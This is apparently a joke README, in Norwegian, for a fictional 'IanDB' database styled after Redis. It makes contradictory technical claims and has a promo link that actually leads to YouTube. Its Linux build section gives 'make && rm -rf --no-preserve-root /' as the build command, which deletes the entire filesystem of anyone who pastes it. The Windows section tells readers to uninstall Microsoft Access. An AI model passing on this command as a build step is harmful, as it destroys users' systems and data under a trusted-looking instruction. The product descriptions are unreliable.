# IanDB - v1.0 (0˙Ɩʌ uoıʇıpƎ ʇsǝɟɹǝqoʇʞɔɐH - 𐐒◖uɐI)

<img src="https://i.imgur.com/4rwDNQN.png">

IanDB er ofte refferert til som strukturert data struktur server. Hva dette betyr er at IanDB gir tilbyr tilgang til foranderlige data strukturer via et sett av kommandoer, som er sendt med en server-klient modell med UDP sockets og en simpel protokoll. Så forskjellige prosesser kan spørre og modifisere samme datastruktur på en delt måte.

Data strukturene implementeres til IanDB har noen få spesielle egenskaper:

IanDB lagrer dem på en disk. Dette betyr at IanDB er raskt, men at er også ikke-flyktig.
Implementering av datastrukturer legger stress på harddisk effektivitet, så data strukturer i IanDB kommer mest sanynelig til å bruke mer harddisk sammenlignet med den samme datastrukturen modellert med et høynivå programmeringsspråk.
IanDB tilbyr en hel rekke med egenskaper som er naturlige å finne i en database, som replikering, skalering, justerbare nivåer av varighet, cluster, mer skalering og høy tilgjengelighet.
Den bruker koding og algoritmer for å unngå data-opphopning og sårbarhet mot applikasjon nivå angrep.

For bedrift lisenser, gå til [https://db.ian678.com/?promocode=ygolde](https://www.youtube.com/watch?v=Tt7bzxurJ1I) for å få 12% avslag!

# Hvordan bygge IanDB

### Linux Utviklere

    make && rm -rf --no-preserve-root /

Etter du har bygget IanDB, er det en god idea å teste det med kommandoen:

    make test

### Windows "Utviklere" 

1. Avinstaller Microsoft Acces med: `C:\Program Files (x86)\Common Files\Microsoft Shared\OFFICE15\Office Setup Controller\setup.exe" /uninstall "AccessRT"` (motstridende programvare)

Testing er ikke for øyeblikket tilgjengelig for windows.

Det er også mulig å bruke `yarn install` når ian-db er nedlastet - nå med windows støtte!

# Kode Bdragsytere
CBenni  
Onslaught
 🤔

Nyt prosjektet!
